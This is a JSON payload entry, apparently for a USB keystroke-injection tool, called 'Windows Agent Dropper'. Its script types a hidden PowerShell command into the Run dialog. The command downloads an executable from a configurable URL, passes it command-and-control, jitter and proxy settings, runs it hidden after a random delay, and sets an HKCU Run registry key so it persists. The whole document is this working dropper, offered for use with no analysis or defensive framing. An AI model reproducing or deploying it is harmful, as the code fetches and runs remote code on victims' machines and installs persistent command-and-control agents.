{
  "name": "Windows Agent Dropper",
  "category": "Persistence",
  "os": "Windows",
  "description": "Hidden PowerShell dropper that downloads, jitters, runs, and persists the DarkBlade agent (HKCU Run). Set variables: AGENT_URL, C2_URL, JITTER, SLEEP, PROXY",
  "script": "REM Windows Agent Dropper with jitter/proxy and HKCU Run persistence\nGUI r\nDELAY 400\nSTRING powershell -w hidden -nop -c \"$ErrorActionPreference='SilentlyContinue';$u='${AGENT_URL}';$p=$env:LOCALAPPDATA+'\\db-agent.exe';try{iwr $u -UseBasicParsing -OutFile $p}catch{$p=$env:TEMP+'\\db-agent.exe';iwr $u -UseBasicParsing -OutFile $p};$env:DB_C2='${C2_URL}';$env:DB_SLEEP='${SLEEP:=60}';$env:DB_JITTER='${JITTER:=30}';if('${PROXY}' -ne ''){$env:DB_PROXY='${PROXY}'};Start-Sleep -Seconds (Get-Random -Maximum ([int]$env:DB_JITTER));Start-Process -FilePath $p -WindowStyle Hidden;reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DB-Agent /t REG_SZ /d '""'+$p+'""' /f\"\nENTER\n"
}